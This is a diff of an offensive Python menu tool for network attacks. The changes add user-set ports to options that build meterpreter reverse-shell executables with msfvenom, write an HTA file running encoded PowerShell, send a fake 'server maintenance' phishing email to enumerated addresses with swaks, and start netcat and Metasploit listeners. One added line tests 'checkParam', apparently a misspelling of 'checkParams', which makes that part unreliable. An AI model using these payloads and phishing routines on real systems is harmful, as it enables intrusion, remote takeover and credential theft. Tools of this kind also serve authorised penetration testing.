@@ -545,7 +545,7 @@ def options():
    print('\u2551' + "(06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
    print('\u2551' + "(07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
    print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSF  SHELL (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20)                  (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Create  Exploits (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Start HTTPServer (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Start SMB Server (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
@@ -716,21 +716,9 @@ if":" in TIP:
    IP46 = "-6"
 else:
    IP46 = "-4"
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub                                                               
-# Version : TREADSTONE                                                             
-# Details : Create locally defined exploit files.
-# Modified: N/A                                                               	
-# -------------------------------------------------------------------------------------
-
-print("[!] Creating exploits and starting rogue agent...")
-command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
-command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux -a x64 -f elf -o " + httpDir + "/linshell64.elf > /dev/null 2>&1")
-command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux -a x86 -f elf -o " + httpDir + "/linshell32.elf > /dev/null 2>&1")
-
+   
+time.sleep(5)
+   
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
@@ -1301,13 +1289,24 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Create locally defined exploit files.
 # Details : 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-     exit(1)
+      num = input("[*] Please specify listening port :")
+      
+      if num.isdigit():
+         print("[*] Creating exploits please wait...")
+         command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=" + num + " --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp LHOST="     + localIP + " LPORT=" + num + " --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
+         command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x64 -f elf -o "   + httpDir + "/linshell64.elf > /dev/null 2>&1")
+         command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x86 -f elf -o "   + httpDir + "/linshell32.elf > /dev/null 2>&1")
+      else:
+         print("[-] Sorry, I do not understand...")
+
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1318,13 +1317,18 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '21':
-      print("[*] Starting HTTP server...")
+      num = input("[*] Please specify listening port :")
       
-      command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'python3 -m http.server 8080'; xdotool key Return"); time.sleep(1)
-      command("xdotool key Ctrl+Tab")      
+      if num.isdigit():
+         print("[*] Starting HTTP server...")
+      
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'python3 -m http.server " + num + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")      
+      else:
+         print("[-] Sorry, I do not understand...")
       
       prompt()
 
@@ -2713,28 +2717,34 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='74':    
-      print("[*] Creating exploit...")
+      num = input("[*] Please specify listening port :")
       
-      payLoad = f"""      
-      a=new ActiveXObject("WScript.Shell");
-      a.run("powershell -nop -w 1 -enc {powershell(localIP, "80")}", 0);window.close();
-      """.encode()
+      if num.isdigit():
+         print("[*] Creating exploit...")
+      
+         payLoad = f"""      
+         a=new ActiveXObject("WScript.Shell");
+         a.run("powershell -nop -w 1 -enc {powershell(localIP, "80")}", 0);window.close();
+         """.encode()
             
-      bpayLoad = base64.b64encode(payLoad)
-      final = encrypt(bpayLoad)
-      with open('payrise.hta', 'w') as hta:
-         hta.write(body(final))
+         bpayLoad = base64.b64encode(payLoad)
+         final = encrypt(bpayLoad)
+         with open('payrise.hta', 'w') as hta:
+            hta.write(body(final))
          
-      print("[+] Exploit created, utilise the following code snippet to activate...")
-      print(colored("\nhttp://" + localIP + ":8080/payrise.hta",colour6))
+         print("[+] Exploit created, utilise the following code snippet to activate...")
+         print(colored("\nhttp://" + localIP + ":" + num + "/payrise.hta",colour6))
       
-      print("\n[*] Starting phishing server...")
+         print("\n[*] Starting phishing server...")
       
-      command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return"); time.sleep(1)
-      command("xdotool key Ctrl+Tab")      
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")    
+      else:
+         print("[-] Sorry I do not understand...") 
+          
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -2748,75 +2758,81 @@ while True:
    if selection =='75':
       checkParams = testTwo()
       
-      if "25" not in POR:
-         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour0))
-         checkParams = 1         
+      num = input("[*] Please specify listening port :")
+      
+      if num.isdigit():
+         if "25" not in POR:
+            print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour0))
+            checkParams = 1         
          
-      if checkParams != 1:
-         command('echo "Hello.\n" > body.tmp')
-         command('echo "We just performed maintenance on our servers." >> body.tmp')
-         command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
-         command('echo "\t  <img src=\""' + localIP + '"/img\">" >> body.tmp')
-         command('echo "\t  Citrix http://"' + localIP + '"/" >> body.tmp')
-         command('echo "  <a href=\"http://"' + localIP + '"\">click me.</a>" >> body.tmp')
-         command('echo "\nRegards," >> body.tmp')
-         command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')  
+         if checkParams != 1:
+            command('echo "Hello.\n" > body.tmp')
+            command('echo "We just performed maintenance on our servers." >> body.tmp')
+            command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
+            command('echo "\t  <img src=\""' + localIP + ":" + num + '"/img\">" >> body.tmp')
+            command('echo "\t  Citrix http://"' + localIP + ":" + num + '"/" >> body.tmp')
+            command('echo "  <a href=\"http://"' + localIP + ":" + num + '"\">click me.</a>" >> body.tmp')
+            command('echo "\nRegards," >> body.tmp')
+            command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')  
                 
-         print("[*] Created phishing email...\n")
-         print(colored("Subject: Credentials/Errors\n", colour3))         
+            print("[*] Created phishing email...\n")
+            print(colored("Subject: Credentials/Errors\n", colour3))         
          
-         with open("body.tmp", "r") as list:
-            for phish in list:
-               phish = phish.rstrip("\n")
-               print(colored(phish,colour3))
-            print("")            
-         print("[*] Checking for valid usernames...")
-         
-         command("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
-         command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")         
-         
-         match = 0                  
-         with open("valid.tmp", "r") as list:			# CLEAN FILE
-            for line in list:
-               line.encode('ascii',errors='ignore')
-               line = line.rstrip("\n")
-               line = line.replace('[92m','')
-               line = line.replace('[00m','')
-               line = line.replace('[SUCC] ', '')
-               line = line.replace('250 OK', '')
-               line = line.replace('...', '')
-               line = line.replace(' ','')
-               
-               if "TEST" not in line:                  
-                  command("echo " + line + " >> phish.tmp")
-                  match = 1                  
-         if match == 1:						# SHOW FOUND PHISH
-             print("[+] Found valid email addresses...\n")
-             with open("phish.tmp", "r") as list:
-                for line in list:
-                   line = line.rstrip("\n")
-                   print(colored(line + "@" + DOM.rstrip(" "),colour6))                           
-         
-         print("[*] Starting phishing server...")
-                   
-         command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return"); time.sleep(1)
-         command("xdotool key Ctrl+Tab")      
-                   
-         if match == 1:
-            print("\n[*] Phishing the list...")			# GO PHISHING
-            with open("phish.tmp", "r") as list:
+            with open("body.tmp", "r") as list:
                for phish in list:
                   phish = phish.rstrip("\n")
-                  phish = phish.strip(" ")
-                  phish = phish + "@"
-                  phish = phish + DOM.rstrip(" ")
-                  command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                  print("[+] Mail sent to " + phish + "...")
+                  print(colored(phish,colour3))
+               print("")            
+            print("[*] Checking for valid usernames...")
+         
+            command("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
+            command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")         
+         
+            match = 0                  
+            with open("valid.tmp", "r") as list:			# CLEAN FILE
+               for line in list:
+                  line.encode('ascii',errors='ignore')
+                  line = line.rstrip("\n")
+                  line = line.replace('[92m','')
+                  line = line.replace('[00m','')
+                  line = line.replace('[SUCC] ', '')
+                  line = line.replace('250 OK', '')
+                  line = line.replace('...', '')
+                  line = line.replace(' ','')
+               
+                  if "TEST" not in line:                  
+                     command("echo " + line + " >> phish.tmp")
+                     match = 1                  
+            if match == 1:						# SHOW FOUND PHISH
+                print("[+] Found valid email addresses...\n")
+                with open("phish.tmp", "r") as list:
+                   for line in list:
+                      line = line.rstrip("\n")
+                      print(colored(line + "@" + DOM.rstrip(" "),colour6))                           
+         
+            print("[*] Starting phishing server...")
+                   
+            command("xdotool key Ctrl+Shift+T")
+            command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
+            command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
+            command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return"); time.sleep(1)
+            command("xdotool key Ctrl+Tab")      
+                   
+            if match == 1:
+               print("\n[*] Phishing the list...")			# GO PHISHING
+               with open("phish.tmp", "r") as list:
+                  for phish in list:
+                     phish = phish.rstrip("\n")
+                     phish = phish.strip(" ")
+                     phish = phish + "@"
+                     phish = phish + DOM.rstrip(" ")
+                     command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                     print("[+] Mail sent to " + phish + "...")
+            else:
+               print("[-] No valid email addresses where found...")
+               
          else:
-            print("[+] No valid email addresses where found...")
+            print("[-] Sorry I do not understand...")                     
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3099,24 +3115,29 @@ while True:
          if "8080" in POR:
             write.write("set RPORT 8080\n")
          else:
-            DATA = input("[*] Please enter tomcat port number: ")
-            write.write("set RPORT " + DATA + "\n")
-         DATA = PAS.rstrip(" ")
-         write.write("set HttpPassword " + DATA + "\n")
-         DATA = USR.rstrip(" ")
-         write.write("set HttpUsername " + DATA + "\n")
-         write.write("set payload java/shell_reverse_tcp\n")
-         command("hostname -I >> temp.tmp")
-         target = linecache.getline("temp.tmp",1)
-         one, two, three, four = target.split(" ")
-         target = two.rstrip(" ")
-         write.write("set lhost " + target + "\n")
-         write.write("run\n")
-         
-      command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
-      command("xdotool key Ctrl+Tab")      
+            num = input("[*] Please specify listening port :")
+            if num.isdigit():         
+               write.write("set RPORT " + num + "\n")
+               DATA = PAS.rstrip(" ")
+               write.write("set HttpPassword " + DATA + "\n")
+               DATA = USR.rstrip(" ")
+               write.write("set HttpUsername " + DATA + "\n")
+               write.write("set payload java/shell_reverse_tcp\n")
+               command("hostname -I >> temp.tmp")
+               target = linecache.getline("temp.tmp",1)
+               one, two, three, four = target.split(" ")
+               target = two.rstrip(" ")
+               write.write("set lhost " + target + "\n")
+               write.write("run\n")
+            else:
+               print("[-] Sorry I do not understand...")
+               checkParams = 1
+               
+      if checkParam != 1:
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")      
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3134,16 +3155,21 @@ while True:
          write.write("use exploit/multi/handler\n")
          write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
          write.write("set LHOST " + localIP + "\n")
-         DATA = input("[*] Please enter shell port number: ")
-         write.write("set LPORT " + DATA + "\n")
-         write.write("clear\n")
-         write.write("cat " + dataDir + "/banner3.txt\n")
-         write.write("run\n")   
+         num = input("[*] Please specify listening port :")
+         if num.isdigit():  
+            write.write("set LPORT " + num + "\n")
+            write.write("clear\n")
+            write.write("cat " + dataDir + "/banner3.txt\n")
+            write.write("run\n")
+         else:
+            print("[-] Sorry I do not understand...")
+            checkParams = 1   
    
-      command("xdotool key Ctrl+Shift+T")
-      command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return"); time.sleep(1)
-      command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
-      command("xdotool key Ctrl+Tab")      
+      if checkParams != 1:
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")      
       
       prompt()
 
